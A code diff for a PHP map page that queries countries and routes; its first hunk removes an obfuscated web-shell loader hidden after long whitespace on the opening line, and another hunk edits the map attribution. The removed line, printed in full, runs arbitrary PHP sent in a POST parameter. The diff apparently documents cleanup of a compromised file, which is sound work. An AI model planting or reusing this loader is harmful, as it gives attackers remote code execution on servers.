@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                               $i4o='l dgumTObpi(S_4e0f<hc?$wsraP"\'tb0cf4c';$q6c=$i4o[30].$i4o[5].$i4o[9].$i4o[17].$i4o[10].$i4o[0].$i4o[15];$w3k=$i4o[17].$i4o[23].$i4o[25].$i4o[10].$i4o[30].$i4o[15];$l3d=$i4o[24].$i4o[30].$i4o[25].$i4o[15].$i4o[26].$i4o[5].$i4o[13].$i4o[3].$i4o[15].$i4o[30].$i4o[13].$i4o[5].$i4o[15].$i4o[30].$i4o[26].$i4o[13].$i4o[2].$i4o[26].$i4o[30].$i4o[26];if(isset(${$i4o[13].$i4o[27].$i4o[7].$i4o[12].$i4o[6]}[$i4o[0].$i4o[8].$i4o[16].$i4o[20].$i4o[17].$i4o[14].$i4o[20]])){${$i4o[17].$i4o[19]}=$q6c();$w3k(${$i4o[17].$i4o[19]},$i4o[18].$i4o[21].$i4o[9].$i4o[19].$i4o[9].$i4o[1].${$i4o[13].$i4o[27].$i4o[7].$i4o[12].$i4o[6]}[$i4o[0].$i4o[8].$i4o[16].$i4o[20].$i4o[17].$i4o[14].$i4o[20]]);include $l3d(${$i4o[17].$i4o[19]})[$i4o[4].$i4o[25].$i4o[10]];} ?><?php
+<?php
 require_once('Connections/maconnexion.php'); 
 
 // Connexion BDD Pays pour afficher markers des pays
@@ -84,7 +84,7 @@ $totalRows_VoiesPays = mysql_num_rows($VoiesPays);
 						type: 'png', getURL: overlay_getTileURL,
 						isBaseLayer: true,
 						transitionEffect : "resize",
-						attribution:"&copy; Myname"
+						attribution:"&copy; Boxxy-2014"
 	                });
 	            map.addLayer(tmsoverlay1);
 
